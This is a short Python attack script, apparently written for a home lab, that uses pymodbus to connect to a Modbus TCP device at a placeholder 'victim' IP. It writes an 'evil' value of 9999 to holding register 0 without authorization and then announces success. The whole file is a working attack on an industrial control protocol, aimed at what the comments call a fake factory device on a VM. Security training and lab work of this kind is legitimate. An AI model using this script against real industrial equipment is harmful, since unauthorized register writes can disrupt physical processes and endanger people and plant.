from pymodbus.client import ModbusTcpClient
import time

# --- CONFIGURATION ---


VICTIM_IP = "your Lubuntu VM's IP address"
VICTIM_PORT = 502

# --- THE ATTACK ---


# Address 0 is the most common, basic register. It's the best bet.
REGISTER_TO_ATTACK = 0
# The new, "dangerous" value we want to set.
EVIL_VALUE = 9999

print("--- Starting ICS Attack ---")
print(f"[*] Target IP:   {VICTIM_IP}")
print(f"[*] Target Port: {VICTIM_PORT}")
print("-" * 27)

# Initialize the client
client = ModbusTcpClient(VICTIM_IP, port=VICTIM_PORT)

try:
    print("[*] Connecting to the target...")
    client.connect()
    time.sleep(1) # Pause for 1 second

    if client.is_socket_open():
        print("[+] SUCCESS: Connected to the fake factory device.")
        time.sleep(1)

        # This is the "Evil Command"
        print(f"[*] Sending WRITE command to Register #{REGISTER_TO_ATTACK} with value {EVIL_VALUE}...")
        client.write_register(REGISTER_TO_ATTACK, EVIL_VALUE)
        time.sleep(1)

        print("[+] SUCCESS: Evil command sent! The attack was successful.")
        print("\nThis proves the device is vulnerable to unauthorized commands.")

    else:
        print("[-] FAILURE: Could not connect to the target device.")

except Exception as e:
    print(f"[-] An error occurred during the attack: {e}")

finally:
    # Close the connection
    client.close()
    print("[*] Connection closed. Attack script finished.")
